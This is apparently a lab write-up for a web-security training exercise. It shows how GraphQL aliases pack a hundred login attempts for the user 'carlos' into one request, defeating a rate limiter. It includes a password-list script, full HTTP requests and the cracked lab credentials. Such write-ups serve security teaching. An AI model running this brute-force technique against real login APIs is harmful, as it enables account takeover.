## Bypassing GraphQL brute force protections

The user login mechanism for this lab is powered by a GraphQL API. The API endpoint has a rate limiter that returns an error if it receives too many requests from the same origin in a short space of time.

To solve the lab, brute force the login mechanism to sign in as carlos. Use the list of authentication lab passwords as your password source.

Tip :

This lab requires you to craft a large request that uses aliases to send multiple login attempts at the same time. As this request could be time-consuming to create manually, we recommend you use a script to build the request.

The below example JavaScript builds a list of aliases corresponding to our list of authentication lab passwords and copies the request to your clipboard. To run this script:

1. Open the lab in Burp's browser.
2. Right-click the page and select Inspect.
3. Select the Console tab.
4. Paste the script and press Enter.

You can then use the generated aliases when crafting your request in Repeater.

```js
copy(`123456,password,12345678,qwerty,123456789,12345,1234,111111,1234567,dragon,123123,baseball,abc123,football,monkey,letmein,shadow,master,666666,qwertyuiop,123321,mustang,1234567890,michael,654321,superman,1qaz2wsx,7777777,121212,000000,qazwsx,123qwe,killer,trustno1,jordan,jennifer,zxcvbnm,asdfgh,hunter,buster,soccer,harley,batman,andrew,tigger,sunshine,iloveyou,2000,charlie,robert,thomas,hockey,ranger,daniel,starwars,klaster,112233,george,computer,michelle,jessica,pepper,1111,zxcvbn,555555,11111111,131313,freedom,777777,pass,maggie,159753,aaaaaa,ginger,princess,joshua,cheese,amanda,summer,love,ashley,nicole,chelsea,biteme,matthew,access,yankees,987654321,dallas,austin,thunder,taylor,matrix,mobilemail,mom,monitor,monitoring,montana,moon,moscow`.split(',').map((element,index)=>`
bruteforce$index:login(input:{password: "$password", username: "carlos"}) {
        token
        success
    }
`.replaceAll('$index',index).replaceAll('$password',element)).join('\n'));console.log("The query has been copied to your clipboard.");
```

## Notes

- /login


## Resume

1. Capture a GraphQL login request  
2. Identify the GraphQL mutation structure  
3. Observe the rate limit protection  
4. Use GraphQL aliases to batch multiple login attempts  
5. Bruteforce the password for `carlos` in a single request  
6. Identify the successful login attempt  
7. Log in using the discovered credentials  

## Solve

Log in to the lab and attempt authentication with invalid credentials.

Capture the request in Burp Suite under **Proxy > HTTP history**.

The login functionality uses a GraphQL mutation:

```http
POST /graphql/v1 HTTP/2
Host: 0a0b0093046645aa8182020e00a2009f.web-security-academy.net
Content-Type: application/json

{
  "query":"mutation{
    login(input:{username:\"test\",password:\"test\"}){
      token
      success
    }
  }"
}
```

Send the request to **Repeater** and perform several failed login attempts.

After a short time, the API starts returning rate limit errors, preventing traditional bruteforce attacks.

Use GraphQL aliases to send multiple login attempts in a single mutation request.

Before sending the request:

- Remove the `variables` dictionary  
- Remove the `operationName` field  
- Keep all login attempts inside a single `mutation {}` block  
- Ensure every alias requests the `success` field  

Use the following request:

```http
POST /graphql/v1 HTTP/2
Host: 0a0b0093046645aa8182020e00a2009f.web-security-academy.net
Cookie: session=4VQvv0KEOn8qkLXvBQFRU5SrqcISb4jo
Content-Type: application/json; charset=utf-8
Accept: application/json

{
  "query": "mutation {\n  bruteforce0: login(input: {username: \"carlos\", password: \"123456\"}) {\n    token\n    success\n  }\n  bruteforce1: login(input: {username: \"carlos\", password: \"password\"}) {\n    token\n    success\n  }\n  bruteforce2: login(input: {username: \"carlos\", password: \"12345678\"}) {\n    token\n    success\n  }\n  bruteforce3: login(input: {username: \"carlos\", password: \"qwerty\"}) {\n    token\n    success\n  }\n  bruteforce4: login(input: {username: \"carlos\", password: \"123456789\"}) {\n    token\n    success\n  }\n  ...\n  bruteforce99: login(input: {username: \"carlos\", password: \"moscow\"}) {\n    token\n    success\n  }\n}"
}
```

Each alias performs an independent login mutation:

```graphql
bruteforce0: login(input: {username: "carlos", password: "123456"}) {
    token
    success
}
```

This bypasses the rate limit because all login attempts are processed within a single GraphQL request.

---

The response returns the result for every alias:

```json
{
  "data": {
    "bruteforce0": {
      "token": "",
      "success": false
    },
    "bruteforce1": {
      "token": "",
      "success": false
    },
    ...
    "bruteforce55": {
      "token": "eyJhbGciOi...",
      "success": true
    }
  }
}
```

Search the response for:

```text
true
```

The alias returning `"success": true` identifies the correct password.

In this case:

```graphql
bruteforce55: login(input: {username: "carlos", password: "klaster"})
```

The valid credentials are:

```text
carlos:klaster
```

The GraphQL schema can also be enumerated using introspection:

```graphql
query IntrospectionQuery {
    __schema {
        mutationType {
            name
        }
        types {
            name
        }
    }
}
```

The introspection response reveals the available mutations:

```graphql
mutation {
    login(input: LoginInput): LoginResponse
    changeEmail(input: ChangeEmailInput): ChangeEmailResponse
}
```

It also exposes the `LoginResponse` object:

```graphql
type LoginResponse {
    token: String
    success: Boolean
}
```

This confirms that login mutations return a boolean `success` field that can be used to identify valid credentials during bruteforce attacks.

Log in using the discovered credentials:

```text
Username: carlos
Password: klaster
```

The login succeeds and solves the lab.


Full request : 

```http
POST /graphql/v1 HTTP/2
Host: 0a0b0093046645aa8182020e00a2009f.web-security-academy.net
Cookie: session=4VQvv0KEOn8qkLXvBQFRU5SrqcISb4jo
Content-Type: application/json; charset=utf-8
Accept: application/json
Origin: https://0a0b0093046645aa8182020e00a2009f.web-security-academy.net
Referer: https://0a0b0093046645aa8182020e00a2009f.web-security-academy.net/
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Content-Length: 10774

{

  "query": "mutation {\n  bruteforce0: login(input: {username: \"carlos\", password: \"123456\"}) {\n    token\n    success\n  }\n  bruteforce1: login(input: {username: \"carlos\", password: \"password\"}) {\n    token\n    success\n  }\n  bruteforce2: login(input: {username: \"carlos\", password: \"12345678\"}) {\n    token\n    success\n  }\n  bruteforce3: login(input: {username: \"carlos\", password: \"qwerty\"}) {\n    token\n    success\n  }\n  bruteforce4: login(input: {username: \"carlos\", password: \"123456789\"}) {\n    token\n    success\n  }\n  bruteforce5: login(input: {username: \"carlos\", password: \"12345\"}) {\n    token\n    success\n  }\n  bruteforce6: login(input: {username: \"carlos\", password: \"1234\"}) {\n    token\n    success\n  }\n  bruteforce7: login(input: {username: \"carlos\", password: \"111111\"}) {\n    token\n    success\n  }\n  bruteforce8: login(input: {username: \"carlos\", password: \"1234567\"}) {\n    token\n    success\n  }\n  bruteforce9: login(input: {username: \"carlos\", password: \"dragon\"}) {\n    token\n    success\n  }\n  bruteforce10: login(input: {username: \"carlos\", password: \"123123\"}) {\n    token\n    success\n  }\n  bruteforce11: login(input: {username: \"carlos\", password: \"baseball\"}) {\n    token\n    success\n  }\n  bruteforce12: login(input: {username: \"carlos\", password: \"abc123\"}) {\n    token\n    success\n  }\n  bruteforce13: login(input: {username: \"carlos\", password: \"football\"}) {\n    token\n    success\n  }\n  bruteforce14: login(input: {username: \"carlos\", password: \"monkey\"}) {\n    token\n    success\n  }\n  bruteforce15: login(input: {username: \"carlos\", password: \"letmein\"}) {\n    token\n    success\n  }\n  bruteforce16: login(input: {username: \"carlos\", password: \"shadow\"}) {\n    token\n    success\n  }\n  bruteforce17: login(input: {username: \"carlos\", password: \"master\"}) {\n    token\n    success\n  }\n  bruteforce18: login(input: {username: \"carlos\", password: \"666666\"}) {\n    token\n    success\n  }\n  bruteforce19: login(input: {username: \"carlos\", password: \"qwertyuiop\"}) {\n    token\n    success\n  }\n  bruteforce20: login(input: {username: \"carlos\", password: \"123321\"}) {\n    token\n    success\n  }\n  bruteforce21: login(input: {username: \"carlos\", password: \"mustang\"}) {\n    token\n    success\n  }\n  bruteforce22: login(input: {username: \"carlos\", password: \"1234567890\"}) {\n    token\n    success\n  }\n  bruteforce23: login(input: {username: \"carlos\", password: \"michael\"}) {\n    token\n    success\n  }\n  bruteforce24: login(input: {username: \"carlos\", password: \"654321\"}) {\n    token\n    success\n  }\n  bruteforce25: login(input: {username: \"carlos\", password: \"superman\"}) {\n    token\n    success\n  }\n  bruteforce26: login(input: {username: \"carlos\", password: \"1qaz2wsx\"}) {\n    token\n    success\n  }\n  bruteforce27: login(input: {username: \"carlos\", password: \"7777777\"}) {\n    token\n    success\n  }\n  bruteforce28: login(input: {username: \"carlos\", password: \"121212\"}) {\n    token\n    success\n  }\n  bruteforce29: login(input: {username: \"carlos\", password: \"000000\"}) {\n    token\n    success\n  }\n  bruteforce30: login(input: {username: \"carlos\", password: \"qazwsx\"}) {\n    token\n    success\n  }\n  bruteforce31: login(input: {username: \"carlos\", password: \"123qwe\"}) {\n    token\n    success\n  }\n  bruteforce32: login(input: {username: \"carlos\", password: \"killer\"}) {\n    token\n    success\n  }\n  bruteforce33: login(input: {username: \"carlos\", password: \"trustno1\"}) {\n    token\n    success\n  }\n  bruteforce34: login(input: {username: \"carlos\", password: \"jordan\"}) {\n    token\n    success\n  }\n  bruteforce35: login(input: {username: \"carlos\", password: \"jennifer\"}) {\n    token\n    success\n  }\n  bruteforce36: login(input: {username: \"carlos\", password: \"zxcvbnm\"}) {\n    token\n    success\n  }\n  bruteforce37: login(input: {username: \"carlos\", password: \"asdfgh\"}) {\n    token\n    success\n  }\n  bruteforce38: login(input: {username: \"carlos\", password: \"hunter\"}) {\n    token\n    success\n  }\n  bruteforce39: login(input: {username: \"carlos\", password: \"buster\"}) {\n    token\n    success\n  }\n  bruteforce40: login(input: {username: \"carlos\", password: \"soccer\"}) {\n    token\n    success\n  }\n  bruteforce41: login(input: {username: \"carlos\", password: \"harley\"}) {\n    token\n    success\n  }\n  bruteforce42: login(input: {username: \"carlos\", password: \"batman\"}) {\n    token\n    success\n  }\n  bruteforce43: login(input: {username: \"carlos\", password: \"andrew\"}) {\n    token\n    success\n  }\n  bruteforce44: login(input: {username: \"carlos\", password: \"tigger\"}) {\n    token\n    success\n  }\n  bruteforce45: login(input: {username: \"carlos\", password: \"sunshine\"}) {\n    token\n    success\n  }\n  bruteforce46: login(input: {username: \"carlos\", password: \"iloveyou\"}) {\n    token\n    success\n  }\n  bruteforce47: login(input: {username: \"carlos\", password: \"2000\"}) {\n    token\n    success\n  }\n  bruteforce48: login(input: {username: \"carlos\", password: \"charlie\"}) {\n    token\n    success\n  }\n  bruteforce49: login(input: {username: \"carlos\", password: \"robert\"}) {\n    token\n    success\n  }\n  bruteforce50: login(input: {username: \"carlos\", password: \"thomas\"}) {\n    token\n    success\n  }\n  bruteforce51: login(input: {username: \"carlos\", password: \"hockey\"}) {\n    token\n    success\n  }\n  bruteforce52: login(input: {username: \"carlos\", password: \"ranger\"}) {\n    token\n    success\n  }\n  bruteforce53: login(input: {username: \"carlos\", password: \"daniel\"}) {\n    token\n    success\n  }\n  bruteforce54: login(input: {username: \"carlos\", password: \"starwars\"}) {\n    token\n    success\n  }\n  bruteforce55: login(input: {username: \"carlos\", password: \"klaster\"}) {\n    token\n    success\n  }\n  bruteforce56: login(input: {username: \"carlos\", password: \"112233\"}) {\n    token\n    success\n  }\n  bruteforce57: login(input: {username: \"carlos\", password: \"george\"}) {\n    token\n    success\n  }\n  bruteforce58: login(input: {username: \"carlos\", password: \"computer\"}) {\n    token\n    success\n  }\n  bruteforce59: login(input: {username: \"carlos\", password: \"michelle\"}) {\n    token\n    success\n  }\n  bruteforce60: login(input: {username: \"carlos\", password: \"jessica\"}) {\n    token\n    success\n  }\n  bruteforce61: login(input: {username: \"carlos\", password: \"pepper\"}) {\n    token\n    success\n  }\n  bruteforce62: login(input: {username: \"carlos\", password: \"1111\"}) {\n    token\n    success\n  }\n  bruteforce63: login(input: {username: \"carlos\", password: \"zxcvbn\"}) {\n    token\n    success\n  }\n  bruteforce64: login(input: {username: \"carlos\", password: \"555555\"}) {\n    token\n    success\n  }\n  bruteforce65: login(input: {username: \"carlos\", password: \"11111111\"}) {\n    token\n    success\n  }\n  bruteforce66: login(input: {username: \"carlos\", password: \"131313\"}) {\n    token\n    success\n  }\n  bruteforce67: login(input: {username: \"carlos\", password: \"freedom\"}) {\n    token\n    success\n  }\n  bruteforce68: login(input: {username: \"carlos\", password: \"777777\"}) {\n    token\n    success\n  }\n  bruteforce69: login(input: {username: \"carlos\", password: \"pass\"}) {\n    token\n    success\n  }\n  bruteforce70: login(input: {username: \"carlos\", password: \"maggie\"}) {\n    token\n    success\n  }\n  bruteforce71: login(input: {username: \"carlos\", password: \"159753\"}) {\n    token\n    success\n  }\n  bruteforce72: login(input: {username: \"carlos\", password: \"aaaaaa\"}) {\n    token\n    success\n  }\n  bruteforce73: login(input: {username: \"carlos\", password: \"ginger\"}) {\n    token\n    success\n  }\n  bruteforce74: login(input: {username: \"carlos\", password: \"princess\"}) {\n    token\n    success\n  }\n  bruteforce75: login(input: {username: \"carlos\", password: \"joshua\"}) {\n    token\n    success\n  }\n  bruteforce76: login(input: {username: \"carlos\", password: \"cheese\"}) {\n    token\n    success\n  }\n  bruteforce77: login(input: {username: \"carlos\", password: \"amanda\"}) {\n    token\n    success\n  }\n  bruteforce78: login(input: {username: \"carlos\", password: \"summer\"}) {\n    token\n    success\n  }\n  bruteforce79: login(input: {username: \"carlos\", password: \"love\"}) {\n    token\n    success\n  }\n  bruteforce80: login(input: {username: \"carlos\", password: \"ashley\"}) {\n    token\n    success\n  }\n  bruteforce81: login(input: {username: \"carlos\", password: \"nicole\"}) {\n    token\n    success\n  }\n  bruteforce82: login(input: {username: \"carlos\", password: \"chelsea\"}) {\n    token\n    success\n  }\n  bruteforce83: login(input: {username: \"carlos\", password: \"biteme\"}) {\n    token\n    success\n  }\n  bruteforce84: login(input: {username: \"carlos\", password: \"matthew\"}) {\n    token\n    success\n  }\n  bruteforce85: login(input: {username: \"carlos\", password: \"access\"}) {\n    token\n    success\n  }\n  bruteforce86: login(input: {username: \"carlos\", password: \"yankees\"}) {\n    token\n    success\n  }\n  bruteforce87: login(input: {username: \"carlos\", password: \"987654321\"}) {\n    token\n    success\n  }\n  bruteforce88: login(input: {username: \"carlos\", password: \"dallas\"}) {\n    token\n    success\n  }\n  bruteforce89: login(input: {username: \"carlos\", password: \"austin\"}) {\n    token\n    success\n  }\n  bruteforce90: login(input: {username: \"carlos\", password: \"thunder\"}) {\n    token\n    success\n  }\n  bruteforce91: login(input: {username: \"carlos\", password: \"taylor\"}) {\n    token\n    success\n  }\n  bruteforce92: login(input: {username: \"carlos\", password: \"matrix\"}) {\n    token\n    success\n  }\n  bruteforce93: login(input: {username: \"carlos\", password: \"mobilemail\"}) {\n    token\n    success\n  }\n  bruteforce94: login(input: {username: \"carlos\", password: \"mom\"}) {\n    token\n    success\n  }\n  bruteforce95: login(input: {username: \"carlos\", password: \"monitor\"}) {\n    token\n    success\n  }\n  bruteforce96: login(input: {username: \"carlos\", password: \"monitoring\"}) {\n    token\n    success\n  }\n  bruteforce97: login(input: {username: \"carlos\", password: \"montana\"}) {\n    token\n    success\n  }\n  bruteforce98: login(input: {username: \"carlos\", password: \"moon\"}) {\n    token\n    success\n  }\n  bruteforce99: login(input: {username: \"carlos\", password: \"moscow\"}) {\n    token\n    success\n  }\n}"

}
```